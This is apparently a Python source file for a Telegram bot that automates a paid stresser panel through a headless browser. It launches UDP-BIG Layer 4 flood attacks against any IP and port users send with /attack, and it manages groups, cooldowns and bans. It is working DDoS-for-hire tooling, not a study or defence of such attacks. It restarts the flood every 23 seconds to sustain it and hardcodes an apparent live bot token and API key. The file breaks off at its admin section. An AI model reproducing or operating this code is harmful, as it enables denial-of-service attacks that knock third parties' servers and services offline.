import re
import logging
import asyncio
import sqlite3
import random
import time  # added for monotonic timing
from datetime import datetime
from typing import Optional, Tuple, Dict, Any

from playwright.async_api import async_playwright, Page, Browser
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# ===== CONFIGURATION =====
BOT_TOKEN = "8644694135:AAGE9gq1svy3oXjYAYv7aJQas-Tz41C7tA4"
API_KEY = "85be6181791e4ad1825e97143634b9cb2984830a5c1e4e029a65b395581c8b3b"
AUTH_URL = "https://retrostress.st/auth"
MASTER_USER_ID = 1241657820
BLACKLISTED_PORTS = {8700, 20000, 443, 17500, 9031, 20002, 20001, 8080, 8086, 8011, 9030}

# ===== BROWSER SELECTION =====
BROWSER_TYPE = "chromium"
HEADLESS_MODE = True
SLOW_MO_MS = 0  # ⚡ FAST - 0ms delay

# ===== LOGGING =====
logging.basicConfig(level=logging.WARNING, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)
for lib in ("httpx", "telegram", "telegram.ext"):
    logging.getLogger(lib).setLevel(logging.WARNING)

# ===== DATABASE =====
conn = sqlite3.connect("attack_bot.db", check_same_thread=False)
cursor = conn.cursor()

cursor.executescript("""
    CREATE TABLE IF NOT EXISTS groups (
        group_id INTEGER PRIMARY KEY,
        approved INTEGER DEFAULT 0,
        duration INTEGER DEFAULT 120,
        cooldown INTEGER DEFAULT 100,
        trial_enabled INTEGER DEFAULT 1
    );
    CREATE TABLE IF NOT EXISTS group_usage (
        group_id INTEGER,
        user_id INTEGER,
        last_attack TEXT,
        UNIQUE(group_id, user_id)
    );
    CREATE TABLE IF NOT EXISTS banned_users (
        user_id INTEGER PRIMARY KEY
    );
    CREATE TABLE IF NOT EXISTS user_activity (
        user_id INTEGER PRIMARY KEY,
        username TEXT,
        first_name TEXT,
        last_name TEXT,
        last_used TEXT
    );
""")
conn.commit()


# ===== HELPER FUNCTIONS =====
def get_group_config(group_id: int) -> Optional[dict]:
    cursor.execute(
        "SELECT approved, duration, cooldown, trial_enabled FROM groups WHERE group_id = ?",
        (group_id,)
    )
    row = cursor.fetchone()
    if row and row[0] == 1:
        return {"duration": row[1], "cooldown": row[2], "trial": bool(row[3])}
    return None


def validate_port(port: str) -> Tuple[bool, Optional[str]]:
    if not port.isdigit():
        return False, "Port must be a number."
    port_num = int(port)
    if not (1 <= port_num <= 65535):
        return False, "Port must be between 1-65535."
    if port_num in BLACKLISTED_PORTS:
        blocked = ", ".join(str(p) for p in sorted(BLACKLISTED_PORTS))
        return False, (
            f"🚫 PORT {port_num} IS BLOCKED\n"
            f"Valid ports: 1-65535 except: {blocked}\n"
            "Common ports: 80, 25565, 27015"
        )
    return True, None


def is_user_banned(user_id: int) -> bool:
    cursor.execute("SELECT 1 FROM banned_users WHERE user_id = ?", (user_id,))
    return cursor.fetchone() is not None


def log_user_activity(user_id: int, username: str = None, first_name: str = None, last_name: str = None) -> None:
    cursor.execute(
        "INSERT OR REPLACE INTO user_activity (user_id, username, first_name, last_name, last_used) "
        "VALUES (?, ?, ?, ?, ?)",
        (user_id, username, first_name, last_name, datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
    )
    conn.commit()


def create_progress_bar(elapsed: float, duration: int) -> str:
    if duration <= 0:
        return "🟥" * 10 + "⬜" * 0 + " 100%"
    progress = min(100, int((elapsed / duration) * 100))
    filled = progress // 10
    return "🟥" * filled + "⬜" * (10 - filled) + f" {progress}%"


def format_attack_response(ip: str, port: str, progress_bar: str, elapsed: int, duration: int, attack_type: str) -> str:
    return (
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🎯 TARGET: {ip}:{port} 🎯\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"💀 DEADLINE PROGRESS:\n"
        f"⚡  {progress_bar} ⚡\n"
        f"⏱️  {elapsed}s / {duration}s\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📌 Type: {attack_type} ATTACK"
    )


# ===== GLOBAL STATE =====
class AttackState:
    def __init__(self):
        self.running = False
        self.stop_requested = False
        self.task: Optional[asyncio.Task] = None
        self.ip: Optional[str] = None
        self.port: Optional[str] = None
        self.panel_ready = False
        self.page: Optional[Page] = None
        self.browser: Optional[Browser] = None
        self.playwright = None
        self.auth_completed = False
        self.last_check = None


state = AttackState()
_active_attacks = {}

# ===== CRITICAL SELECTORS FOR RECHECK =====
CRITICAL_SELECTORS = {
    "ip_input": "input.ct-input.ct-mono[type='text'][placeholder*='1.2.3.4']",
    "port_input": "input.ct-input.ct-mono[type='number']",
    "udp_tab": "button.ct-pill:has-text('UDP')",
    "method_dropdown": "button.ct-combo-trigger",
    "udp_big_item": "button.ct-combo-item:has-text('UDP-BIG')",
    "execute_button": "button:has-text('EXECUTE_TEST')",
    "layer4_button": "button:has-text('LAYER 4')"
}


# ===== ROBUST FIELD HELPERS =====
async def fill_with_retry(page: Page, selector: str, value: str, retries: int = 5, delay: float = 1.0) -> bool:
    """Fill a field with retries and verify the value."""
    for attempt in range(retries):
        try:
            # Wait for element to be visible and enabled
            await page.wait_for_selector(selector, state="visible", timeout=5000)
            # Clear and fill
            await page.click(selector, click_count=3)  # select all
            await page.keyboard.press("Backspace")
            await page.fill(selector, value, timeout=5000)
            # Verify
            actual = await page.input_value(selector, timeout=3000)
            if actual == value:
                logger.info(f"✅ Filled {selector} with '{value}' (attempt {attempt+1})")
                return True
            else:
                logger.warning(f"⚠️ Fill verification failed for {selector}: expected '{value}', got '{actual}'")
        except Exception as e:
            logger.warning(f"⚠️ Fill attempt {attempt+1} for {selector} failed: {str(e)[:50]}")
        await asyncio.sleep(delay)
    return False


async def click_with_retry(page: Page, selector: str, retries: int = 5, delay: float = 1.0) -> bool:
    """Click an element with retries."""
    for attempt in range(retries):
        try:
            await page.wait_for_selector(selector, state="visible", timeout=5000)
            await page.click(selector, timeout=5000)
            logger.info(f"✅ Clicked {selector} (attempt {attempt+1})")
            return True
        except Exception as e:
            logger.warning(f"⚠️ Click attempt {attempt+1} for {selector} failed: {str(e)[:50]}")
        await asyncio.sleep(delay)
    return False


async def wait_for_element(page: Page, selector: str, timeout: float = 10000, state: str = "visible") -> bool:
    """Wait for an element to be in a certain state."""
    try:
        await page.wait_for_selector(selector, state=state, timeout=timeout)
        return True
    except Exception:
        return False


# ===== RECHECK FUNCTION =====
async def perform_full_recheck(update: Update = None) -> Dict[str, Any]:
    """Re-verify entire automation state without unnecessary restarts."""
    results = {
        "valid": False,
        "auth_ok": False,
        "panel_ok": False,
        "elements_ok": False,
        "details": [],
        "needs_restart": False
    }
    
    # Check if we have a page
    if state.page is None:
        results["details"].append("❌ No page object exists")
        results["needs_restart"] = True
        if update:
            await update.message.reply_text("❌ No page object. Run /start first.")
        return results
    
    # Check if page is still alive
    try:
        await state.page.evaluate("1")
        results["details"].append("✅ Page is responsive")
    except Exception as e:
        results["details"].append(f"❌ Page is dead: {str(e)[:50]}")
        results["needs_restart"] = True
        if update:
            await update.message.reply_text("❌ Page is dead. Run /start to restart.")
        return results
    
    # CHECK 1: AUTH STATUS
    try:
        current_url = state.page.url
        results["details"].append(f"📍 Current URL: {current_url}")
        
        # Check if still on auth page
        if "auth" in current_url.lower():
            results["details"].append("⚠️ Still on auth page - authentication may not be complete")
            results["auth_ok"] = False
            
            # Try to detect if auth form is present
            try:
                auth_input = await state.page.query_selector("input#accessKey")
                if auth_input:
                    results["details"].append("⚠️ Auth form still present")
                else:
                    results["details"].append("⚠️ On auth page but form not found")
            except:
                pass
        else:
            results["details"].append("✅ Not on auth page - likely authenticated")
            results["auth_ok"] = True
            
    except Exception as e:
        results["details"].append(f"⚠️ URL check failed: {str(e)[:50]}")
        results["auth_ok"] = False
    
    # CHECK 2: PANEL PRESENCE
    if results["auth_ok"]:
        try:
            # Look for panel-specific elements
            panel_indicators = [
                "input.ct-input.ct-mono",
                "button.ct-pill",
                "button.ct-combo-trigger"
            ]
            
            found_panel = False
            for selector in panel_indicators:
                try:
                    elem = await state.page.query_selector(selector)
                    if elem:
                        found_panel = True
                        results["details"].append(f"✅ Found panel element: {selector}")
                        break
                except:
                    pass
            
            if found_panel:
                results["panel_ok"] = True
                results["details"].append("✅ Panel appears to be loaded")
            else:
                results["details"].append("⚠️ No panel elements found - may be on wrong page")
                results["panel_ok"] = False
                
        except Exception as e:
            results["details"].append(f"⚠️ Panel check failed: {str(e)[:50]}")
    
    # CHECK 3: CRITICAL ELEMENTS
    if results["panel_ok"]:
        missing_elements = []
        found_elements = []
        
        for name, selector in CRITICAL_SELECTORS.items():
            try:
                elem = await state.page.query_selector(selector)
                if elem:
                    found_elements.append(name)
                    # Check if interactable
                    try:
                        is_visible = await elem.is_visible()
                        if not is_visible:
                            missing_elements.append(f"{name} (hidden)")
                    except:
                        pass
                else:
                    missing_elements.append(name)
            except Exception:
                missing_elements.append(name)
        
        if missing_elements:
            results["details"].append(f"⚠️ Missing elements: {', '.join(missing_elements)}")
            results["elements_ok"] = False
        else:
            results["details"].append(f"✅ All critical elements present: {', '.join(found_elements)}")
            results["elements_ok"] = True
    
    # Final verdict
    if results["auth_ok"] and results["panel_ok"] and results["elements_ok"]:
        results["valid"] = True
        state.panel_ready = True
        state.auth_completed = True
        state.last_check = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        results["details"].append("✅ Full recheck passed - state is valid")
    else:
        results["valid"] = False
        results["details"].append("❌ Recheck failed - some components missing")
        if results["needs_restart"] or not results["auth_ok"]:
            results["details"].append("💡 Run /start to reinitialize")
    
    return results


# ===== AUTHENTICATION + PANEL IN ONE FLOW =====
async def init_browser_and_panel(update: Update) -> bool:
    """Ek hi flow mein browser launch, auth, aur panel setup"""
    global state
    
    # Agar already ready hai toh return
    if state.panel_ready and state.page is not None:
        await update.message.reply_text("✅ Panel already ready! Use /attack")
        return True
    
    try:
        # 1. BROWSER LAUNCH
        logger.info("🌐 Launching browser...")
        state.playwright = await async_playwright().start()
        
        launch_args = {
            "headless": HEADLESS_MODE,
            "slow_mo": SLOW_MO_MS,
            "args": [
                "--no-sandbox",
                "--disable-dev-shm-usage",
                "--disable-extensions",
                "--disable-gpu",
                "--window-size=1280,800"
            ]
        }
        
        if BROWSER_TYPE == "chromium":
            state.browser = await state.playwright.chromium.launch(**launch_args)
        elif BROWSER_TYPE == "firefox":
            state.browser = await state.playwright.firefox.launch(**launch_args)
        elif BROWSER_TYPE == "webkit":
            state.browser = await state.playwright.webkit.launch(**launch_args)
        else:
            raise ValueError(f"Unsupported browser: {BROWSER_TYPE}")
        
        logger.info(f"✅ {BROWSER_TYPE.capitalize()} launched (visible)")
        
        # 2. EK HI PAGE - AUTH KE LIYE
        state.page = await state.browser.new_page()
        await update.message.reply_text("🔐 Opening auth page...")
        
        logger.info("🔐 Navigating to auth...")
        await state.page.goto(AUTH_URL, timeout=60000)
        await state.page.wait_for_load_state("domcontentloaded", timeout=15000)
        await state.page.wait_for_selector("input#accessKey", state="visible", timeout=10000)
        
        # 3. AUTHENTICATION FLOW WITH RETRIES
        auth_success = False
        for auth_attempt in range(3):  # max 3 attempts
            await update.message.reply_text(f"📝 Entering API key (attempt {auth_attempt+1}/3)...")
            
            # Fill key with verification
            key_filled = await fill_with_retry(state.page, "input#accessKey", API_KEY, retries=3, delay=0.5)
            if not key_filled:
                await update.message.reply_text("⚠️ Failed to fill key, retrying...")
                continue
            
            # Click authenticate button
            await update.message.reply_text("🔑 Clicking authenticate...")
            auth_clicked = await click_with_retry(state.page, "button:has-text('AUTHENTICATE')", retries=3, delay=0.5)
            if not auth_clicked:
                await update.message.reply_text("⚠️ Failed to click authenticate, retrying...")
                continue
            
            # Wait for auth to complete (page change)
            await update.message.reply_text("⏳ Waiting for authentication...")
            # Wait for network idle or redirect
            try:
                await state.page.wait_for_load_state("networkidle", timeout=15000)
            except:
                pass
            await asyncio.sleep(2)
            
            # Verify authentication success: check if we are no longer on auth page
            current_url = state.page.url
            if "auth" not in current_url.lower():
                auth_success = True
                await update.message.reply_text("✅ Authentication successful!")
                break
            else:
                # Check for error message
                try:
                    error_elem = await state.page.query_selector(".alert-danger, .error, .ct-alert")
                    if error_elem:
                        error_text = await error_elem.text_content()
                        await update.message.reply_text(f"❌ Auth error: {error_text[:100]}. Retrying...")
                except:
                    pass
                await update.message.reply_text("⚠️ Authentication still on auth page, retrying...")
                # Reload page to clear state
                await state.page.reload()
                await state.page.wait_for_selector("input#accessKey", state="visible", timeout=5000)
        
        if not auth_success:
            await update.message.reply_text("❌ Authentication failed after multiple attempts. Please try /start again.")
            return False
        
        # ✅ CHANGE: CLICK START TEST BUTTON INSTEAD OF DIRECT NAVIGATION
        await update.message.reply_text("🔘 Looking for START TEST button...")
        logger.info("🔘 Searching for START TEST button...")
        
        start_clicked = False
        try:
            # Wait for button with robust selector
            if await wait_for_element(state.page, 'a.btn.btn-primary:has-text("START TEST")', timeout=30000):
                start_clicked = await click_with_retry(state.page, 'a.btn.btn-primary:has-text("START TEST")', retries=3, delay=1)
            if not start_clicked:
                # Fallback: try href
                await update.message.reply_text("⚠️ START TEST button not found, trying href fallback...")
                try:
                    await state.page.click('a[href="/panel"]', timeout=10000)
                    start_clicked = True
                except Exception as e2:
                    logger.warning(f"⚠️ Href fallback failed: {e2}")
                    await update.message.reply_text("⚠️ Manual click required. Please click START TEST in browser.")
                    await asyncio.sleep(5)
                    # After manual click, we can still proceed
                    start_clicked = True  # Assume user will click
        except Exception as e:
            await update.message.reply_text(f"⚠️ START TEST button error: {str(e)[:100]}")
            # Try manual fallback
            await update.message.reply_text("⚠️ Please click START TEST manually in the browser.")
            await asyncio.sleep(5)
            start_clicked = True
        
        # 6. WAIT FOR PANEL TO LOAD AFTER CLICK
        await update.message.reply_text("🌐 Waiting for panel to load...")
        await state.page.wait_for_load_state("networkidle", timeout=60000)
        logger.info("✅ Panel loaded via START TEST button click!")
        
        # 7. PANEL SETUP - LAYER 4 with retries
        await update.message.reply_text("⚙️ Setting up panel (LAYER 4)...")
        if await click_with_retry(state.page, "button:has-text('LAYER 4')", retries=3, delay=0.5):
            await asyncio.sleep(0.5)
            logger.info("✅ LAYER 4 selected")
        else:
            logger.warning("LAYER 4 click failed")
        
        # 8. DEFAULT IP with verification
        ip_sel = "input[placeholder='1.2.3.4 or 1.2.3.0/24']"
        if await fill_with_retry(state.page, ip_sel, "1.2.3.4", retries=3, delay=0.5):
            logger.info("✅ Default IP set")
        else:
            logger.warning("IP set failed")
        
        # 9. DEFAULT PORT with verification
        port_sel = "input.ct-input.ct-mono[type='number']"
        if await fill_with_retry(state.page, port_sel, "80", retries=3, delay=0.5):
            logger.info("✅ Default port set")
        else:
            logger.warning("Port set failed")
        
        # 10. UDP-BIG SELECT
        await update.message.reply_text("📌 Selecting UDP-BIG method...")
        if await select_udp_big(state.page, update):
            await update.message.reply_text("✅ UDP-BIG selected!")
        else:
            await update.message.reply_text("⚠️ UDP-BIG selection failed, but panel may still work.")
        
        state.panel_ready = True
        state.auth_completed = True
        
        await update.message.reply_text(
            "✅ PANEL READY! (Auth + START TEST button click)\n"
            "Send: /attack <IP> <PORT> <TIME>\n"
            "Example: /attack 1.2.3.4 80 60\n"
            "👁️ Browser is visible - watch the action!"
        )
        return True
        
    except Exception as e:
        logger.error(f"❌ Init error: {e}")
        await update.message.reply_text(f"❌ Initialization failed: {str(e)[:200]}")
        state.panel_ready = False
        return False


async def select_udp_big(page: Page, update: Update = None) -> bool:
    """Select UDP-BIG method with retries."""
    try:
        logger.info("🔄 Selecting UDP-BIG...")
        
        # Click UDP tab
        if not await click_with_retry(page, "button.ct-pill:has-text('UDP')", retries=3, delay=0.5):
            return False
        await asyncio.sleep(0.3)
        
        # Click combo trigger
        if not await click_with_retry(page, "button.ct-combo-trigger", retries=3, delay=0.5):
            return False
        await asyncio.sleep(0.3)
        
        # Click UDP-BIG item
        if not await click_with_retry(page, "button.ct-combo-item:has-text('UDP-BIG')", retries=3, delay=0.5):
            return False
        await asyncio.sleep(0.3)
        
        logger.info("✅ UDP-BIG selected")
        return True
        
    except Exception:
        # Fallback via evaluate
        try:
            await page.evaluate("""
                const udpBtn = document.querySelector('button.ct-pill');
                if (udpBtn && udpBtn.textContent.trim() === 'UDP') udpBtn.click();
                
                setTimeout(() => {
                    const trigger = document.querySelector('button.ct-combo-trigger');
                    if (trigger) trigger.click();
                    
                    setTimeout(() => {
                        const items = document.querySelectorAll('button.ct-combo-item');
                        for (let item of items) {
                            if (item.textContent.trim() === 'UDP-BIG') {
                                item.click();
                                break;
                            }
                        }
                    }, 300);
                }, 300);
            """)
            await asyncio.sleep(1)
            logger.info("✅ UDP-BIG selected via fallback")
            return True
        except Exception as e2:
            logger.error(f"❌ UDP-BIG selection failed: {e2}")
            return False


async def find_stop_button(page: Page):
    """Find individual stop button"""
    selectors = [
        'button.ct-act.ct-act-danger:has-text("stop")',
        'button.ct-act.ct-act-danger',
        'button:has-text("stop")'
    ]
    for selector in selectors:
        try:
            btns = await page.query_selector_all(selector)
            for btn in btns:
                text = await btn.text_content()
                if text and "stop" in text.lower() and "all" not in text.lower():
                    return btn
        except Exception:
            continue
    return None


# ===== FIXED ATTACK LOOP WITH ACCURATE TIMING =====
async def launch_attack_fast(ip: str, port: str, total_duration: int, update: Update) -> str:
    global state
    
    if not state.panel_ready or state.page is None:
        return "❌ Panel not ready. Run /start first."
    
    try:
        await state.page.evaluate("1")
    except Exception:
        state.panel_ready = False
        return "❌ Page closed. Run /start again."
    
    state.running = True
    state.stop_requested = False
    
    # SET TARGET IP + PORT with retries and verification
    logger.info(f"🎯 Setting target: {ip}:{port}")
    
    ip_sel = "input.ct-input.ct-mono[type='text'][placeholder*='1.2.3.4']"
    if not await fill_with_retry(state.page, ip_sel, ip, retries=5, delay=0.5):
        state.running = False
        return "❌ Failed to set IP after retries"
    
    port_sel = "input.ct-input.ct-mono[type='number']"
    if not await fill_with_retry(state.page, port_sel, port, retries=5, delay=0.5):
        state.running = False
        return "❌ Failed to set port after retries"
    
    logger.info(f"✅ Target set: {ip}:{port}")
    
    # START ATTACK with retries
    start_success = False
    for _ in range(3):
        try:
            await state.page.click("button:has-text('EXECUTE_TEST')", timeout=5000)
            start_success = True
            logger.info("✅ Attack started")
            break
        except Exception:
            try:
                await state.page.click("button:has-text('Execute')", timeout=3000)
                start_success = True
                break
            except Exception:
                try:
                    await state.page.click(".ct-btn-primary", timeout=3000)
                    start_success = True
                    break
                except Exception:
                    try:
                        await state.page.evaluate("""
                            document.querySelectorAll('button').forEach(b => {
                                if(b.textContent.includes('EXECUTE') || b.textContent.includes('Execute')) {
                                    b.click();
                                }
                            });
                        """)
                        start_success = True
                        break
                    except Exception:
                        pass
        await asyncio.sleep(0.5)
    
    if not start_success:
        state.running = False
        return "❌ Failed to start attack"
    
    # --- MAIN LOOP WITH ACCURATE TIMING ---
    start_time = time.monotonic()
    total_downtime = 0.0  # cumulative time when attack is stopped for restart
    
    # We'll keep restarting every 23 seconds of active time
    restart_interval = 23.0
    next_restart_at = restart_interval  # active time when we should restart
    
    while state.running:
        # Calculate active elapsed (time attack has been running)
        now = time.monotonic()
        active_elapsed = now - start_time - total_downtime
        
        # Check if we reached the total duration
        if active_elapsed >= total_duration:
            break
        
        # Check for user stop request
        if state.stop_requested:
            break
        
        # Check if it's time to restart (based on active time)
        if active_elapsed >= next_restart_at and active_elapsed < total_duration:
            logger.info(f"🔄 Restarting at active elapsed {active_elapsed:.1f}s")
            # Record time before restart
            before_restart = time.monotonic()
            
            # Stop the current attack
            stop_btn = await find_stop_button(state.page)
            if stop_btn:
                await stop_btn.click()
                await asyncio.sleep(0.3)
            
            # Start a new attack
            try:
                await state.page.click("button:has-text('EXECUTE_TEST')", timeout=5000)
                await asyncio.sleep(0.2)
                logger.info(f"🔄 Attack restarted at active {active_elapsed:.1f}s")
            except Exception as e:
                await update.message.reply_text(f"❌ Restart failed: {str(e)[:50]}")
                state.running = False
                break
            
            # Calculate downtime for this restart
            after_restart = time.monotonic()
            total_downtime += (after_restart - before_restart)
            
            # Schedule next restart
            next_restart_at += restart_interval
        
        # Sleep a short time to avoid busy loop
        await asyncio.sleep(0.1)
    
    # Stop the attack at the end if still running
    if state.running:
        stop_btn = await find_stop_button(state.page)
        if stop_btn:
            await stop_btn.click()
            await asyncio.sleep(0.5)
            logger.info("🛑 Attack stopped")
    
    state.running = False
    return "✅ Attack completed."


async def progress_updater(update: Update, message, duration: int, attack_type: str, ip: str, port: str) -> None:
    """Update progress message using wall-clock time (approximate)."""
    start_time = time.monotonic()
    elapsed = 0.0
    while elapsed <= duration:
        sleep_time = random.uniform(0.7, 1.3)
        await asyncio.sleep(sleep_time)
        elapsed = min(duration, time.monotonic() - start_time)
        
        bar = create_progress_bar(elapsed, duration)
        text = format_attack_response(ip, port, bar, int(elapsed), duration, attack_type)
        try:
            await message.edit_text(text)
        except Exception:
            pass
    
    bar = create_progress_bar(duration, duration)
    text = (
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🎯 TARGET: {ip}:{port} 🎯\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "✅ ATTACK COMPLETED!\n"
        f"💀 DEADLINE PROGRESS:\n"
        f"⚡  {bar} ⚡\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📌 Type: {attack_type} ATTACK"
    )
    try:
        await message.edit_text(text)
    except Exception:
        pass


# ===== TELEGRAM HANDLERS =====
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if is_user_banned(user.id):
        await update.message.reply_text("⛔ You are banned from using this bot.")
        return
    
    log_user_activity(user.id, user.username, user.first_name, user.last_name)
    
    chat = update.effective_chat
    if chat.type in ("group", "supergroup"):
        config = get_group_config(chat.id)
        if not config:
            await update.message.reply_text("❌ This group is not approved. Contact @tfyours")
            return
        if config["trial"]:
            await update.message.reply_text(
                "╔════════════════════════════════════╗\n"
                "║       🌐 ATTACK BOT READY         ║\n"
                "╠════════════════════════════════════╣\n"
                "║  📌 GROUP MODE                    ║\n"
                f"║  ⏱️  Duration: {config['duration']}s        ║\n"
                f"║  🔄 Cooldown: {config['cooldown']}s        ║\n"
                "║  📝 Use: /attack <ip> <port>      ║\n"
                "║  📊 /status - Check attacks       ║\n"
                "║  🔍 /recheck - Verify state       ║\n"
                "║  👁️ Browser: VISIBLE              ║\n"
                "╚════════════════════════════════════╝"
            )
        else:
            await update.message.reply_text("⛔ Trial disabled in this group.")
        return
    
    await update.message.reply_text(
        "╔════════════════════════════════════╗\n"
        "║      🚀 ATTACK BOT READY          ║\n"
        "╠════════════════════════════════════╣\n"
        "║  📌 PRIVATE MODE                  ║\n"
        "║  📝 Use: /attack <ip> <port> <time>║\n"
        "║  📊 /status - Check attacks       ║\n"
        "║  🔍 /recheck - Verify state       ║\n"
        "║  👁️ Browser: VISIBLE              ║\n"
        "╚════════════════════════════════════╝"
    )
    
    if not state.panel_ready:
        if not await init_browser_and_panel(update):
            await update.message.reply_text("❌ Initialization failed.")
    else:
        await update.message.reply_text("✅ Panel already ready! Use /attack")


async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if is_user_banned(user.id):
        await update.message.reply_text("⛔ You are banned from using this bot.")
        return
    
    log_user_activity(user.id, user.username, user.first_name, user.last_name)
    
    if state.running:
        await update.message.reply_text("❌ An attack is already in progress. Please wait.")
        return
    
    args = context.args
    if not args or len(args) < 3:
        await update.message.reply_text("❌ Usage: /attack <IP> <PORT> <TIME>\nExample: /attack 34.0.25.456 85646 100")
        return
    
    ip, port, time_str = args[0], args[1], args[2]
    
    if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', ip):
        await update.message.reply_text("❌ Invalid IP address format")
        return
    
    valid, err = validate_port(port)
    if not valid:
        await update.message.reply_text(err)
        return
    
    if not time_str.isdigit() or int(time_str) < 1:
        await update.message.reply_text("❌ Time must be >= 1 second")
        return
    
    duration = int(time_str)
    chat = update.effective_chat
    
    if chat.type in ("group", "supergroup"):
        config = get_group_config(chat.id)
        if not config:
            await update.message.reply_text("❌ Group not approved. Contact @tfyours")
            return
        if not config["trial"]:
            await update.message.reply_text("⛔ Trial disabled in this group.")
            return
        if duration > config["duration"]:
            await update.message.reply_text(f"⏱️ Max duration for this group is {config['duration']}s")
            return
        
        cursor.execute(
            "SELECT last_attack FROM group_usage WHERE group_id = ? AND user_id = ?",
            (chat.id, user.id)
        )
        row = cursor.fetchone()
        if row:
            last = datetime.strptime(row[0], "%Y-%m-%d %H:%M:%S")
            diff = (datetime.now() - last).total_seconds()
            if diff < config["cooldown"]:
                remaining = int(config["cooldown"] - diff)
                await update.message.reply_text(f"⏳ Cooldown {remaining}s left.")
                return
        
        cursor.execute(
            "INSERT OR REPLACE INTO group_usage (group_id, user_id, last_attack) VALUES (?, ?, ?)",
            (chat.id, user.id, datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
        )
        conn.commit()
    
    if not state.panel_ready or state.page is None:
        await update.message.reply_text("❌ Panel not ready. Please run /start first.")
        return
    
    attack_type = "GROUP" if chat.type in ("group", "supergroup") else "PRIVATE"
    
    state.task = asyncio.create_task(launch_attack_fast(ip, port, duration, update))
    
    bar = create_progress_bar(0, duration)
    text = format_attack_response(ip, port, bar, 0, duration, attack_type)
    sent = await update.message.reply_text(text)
    
    asyncio.create_task(progress_updater(update, sent, duration, attack_type, ip, port))


async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if is_user_banned(user.id):
        await update.message.reply_text("⛔ You are banned from using this bot.")
        return
    
    log_user_activity(user.id, user.username, user.first_name, user.last_name)
    
    if not state.running:
        await update.message.reply_text("❌ No attack is currently running.")
        return
    
    await update.message.reply_text("🛑 Stopping attack...")
    state.stop_requested = True
    await asyncio.sleep(3)
    
    if state.task and not state.task.done():
        state.task.cancel()
    
    state.running = False
    state.stop_requested = False
    await update.message.reply_text("✅ Attack stopped.")


async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if is_user_banned(user.id):
        await update.message.reply_text("⛔ You are banned from using this bot.")
        return
    
    log_user_activity(user.id, user.username, user.first_name, user.last_name)
    
    status = (
        f"📍 Panel Ready: {'Yes' if state.panel_ready else 'No'}\n"
        f"📍 Auth Completed: {'Yes' if state.auth_completed else 'No'}\n"
        f"📍 Page Active: {'Yes' if state.page is not None else 'No'}\n"
        f"📍 IP: {state.ip or 'Not set'}\n"
        f"📍 Port: {state.port or 'Not set'}\n"
        "📌 Method: UDP-BIG\n"
        f"⚡ Attack running: {'Yes' if state.running else 'No'}\n"
        f"🔍 Last Check: {state.last_check or 'Never'}\n"
        "👁️ Browser: VISIBLE (same page auth+panel)"
    )
    await update.message.reply_text(status)


async def recheck_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Re-verify entire automation state without unnecessary restart."""
    user = update.effective_user
    if is_user_banned(user.id):
        await update.message.reply_text("⛔ You are banned from using this bot.")
        return
    
    log_user_activity(user.id, user.username, user.first_name, user.last_name)
    
    await update.message.reply_text("🔍 Running full state recheck...")
    
    results = await perform_full_recheck(update)
    
    # Build response
    response = "╔════════════════════════════════════╗\n"
    response += "║      🔍 RECHECK RESULTS           ║\n"
    response += "╠════════════════════════════════════╣\n"
    
    status_icon = "✅" if results["valid"] else "❌"
    response += f"║  Status: {status_icon} {'VALID' if results['valid'] else 'INVALID'}\n"
    response += "║────────────────────────────────────║\n"
    
    response += f"║  Auth: {'✅ OK' if results['auth_ok'] else '❌ FAIL'}\n"
    response += f"║  Panel: {'✅ OK' if results['panel_ok'] else '❌ FAIL'}\n"
    response += f"║  Elements: {'✅ OK' if results['elements_ok'] else '❌ FAIL'}\n"
    
    if results["needs_restart"]:
        response += "║  💡 ACTION: Run /start\n"
    elif not results["valid"]:
        response += "║  💡 ACTION: Run /start\n"
    else:
        response += "║  ✅ All systems ready\n"
    
    response += "╠────────────────────────────────────╣\n"
    
    # Add first few details
    detail_lines = results["details"][:5]
    for detail in detail_lines:
        if len(detail) > 30:
            detail = detail[:27] + "..."
        response += f"║  {detail}\n"
    
    if len(results["details"]) > 5:
        response += f"║  ... and {len(results['details']) - 5} more\n"
    
    response += "╚════════════════════════════════════╝"
    
    await update.message.reply_text(response)
    
    if results["needs_restart"] or not results["valid"]:
        await update.message.reply_text(
            "💡 State invalid. Run /start to reinitialize the panel.\n"
            "This will launch a new browser session and re-authenticate."
        )
    else:
        await update.message.reply_text(
            "✅ All systems green. You can use /attack now."
        )


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if is_user_banned(user.id):
        await update.message.reply_text("⛔ You are banned from using this bot.")
        return
    
    log_user_activity(user.id, user.username, user.first_name, user.last_name)
    
    await update.message.reply_text(
        "╔════════════════════════════════════╗\n"
        "║      📖 COMMANDS LIST             ║\n"
        "╠════════════════════════════════════╣\n"
        "║  /start - Init panel (ONCE)       ║\n"
        "║  /attack <IP> <PORT> <TIME>       ║\n"
        "║  /stop - Stop current attack      ║\n"
        "║  /status - Show current state     ║\n"
        "║  /recheck - Verify full state     ║\n"
        "║  /help - Show this help           ║\n"
        "║  /admin - Admin panel             ║\n"
        "║  /restart - (Admin) Full restart  ║\n"
        "╠════════════════════════════════════╣\n"
        "║  ⭐ SAME PAGE AUTH + PANEL        ║\n"
        "║  ⏱️ Panel opens ONCE on /start    ║\n"
        "║  /attack changes IP/port only     ║\n"
        "║  Example: /attack 1.2.3.4 80 60   ║\n"
        "║  Use /stop to end early           ║\n"
        "║  👁️ Browser: VISIBLE              ║\n"
        "╚════════════════════════════════════╝"
    )


# ===== ADMIN COMMANDS =====
